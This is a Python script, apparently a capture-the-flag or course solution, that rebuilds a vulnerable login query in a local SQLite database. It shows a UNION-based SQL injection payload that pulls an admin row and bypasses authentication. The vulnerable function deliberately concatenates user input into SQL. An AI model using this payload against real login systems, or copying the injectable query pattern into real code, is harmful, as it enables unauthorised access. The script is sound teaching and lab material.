#!/usr/bin/env python3
"""
Challenge 12 - UNION-based SQL injection to get past the login.

I can't include the instructor's database.db, so this script builds a small copy of the
schema locally and runs both the vulnerable query and the injection, so the whole thing
works on its own.

The vulnerable query (from the decompiled code) is:
    SELECT id,name,role FROM users
    WHERE username='<USER>' AND password=('<md5(pass)>')

The users table has no admins; they're in a separate admins table. The filters (one
single quote max in the username, the word "where" blocked, password MD5'd) don't stop
a UNION that reads from admins and comments out the rest.

Payload (username field):
    ' UNION SELECT id,name,role FROM admins--
"""
import hashlib
import sqlite3

PAYLOAD = "' UNION SELECT id,name,role FROM admins--"


def build_db() -> sqlite3.Connection:
    con = sqlite3.connect(":memory:")
    con.executescript(
        """
        CREATE TABLE users  (id INTEGER PRIMARY KEY, username TEXT, password TEXT, name TEXT, role TEXT);
        CREATE TABLE admins (id INTEGER PRIMARY KEY, username TEXT, password TEXT, name TEXT, role TEXT);
        INSERT INTO users VALUES (1,'alice','x','alice','user'),(2,'bob','x','bob','user');
        INSERT INTO admins VALUES (1,'victor','x','victor','admin');
        """
    )
    return con


def vulnerable_login(con, username, password):
    md5 = hashlib.md5(password.encode()).hexdigest()
    # this is the bug: user input is concatenated straight into the SQL
    query = (f"SELECT id,name,role FROM users "
             f"WHERE username='{username}' AND password=('{md5}')")
    return query, con.execute(query).fetchall()


def main() -> None:
    con = build_db()
    query, rows = vulnerable_login(con, PAYLOAD, "test")
    print("Executed query:\n ", query, "\n")
    print("Rows returned:", rows)
    admin = [r for r in rows if r[2] == "admin"]
    print("Admin row reached:", admin[0] if admin else None)
    print("\nResult: logged in as admin without knowing the admin password.")


if __name__ == "__main__":
    main()
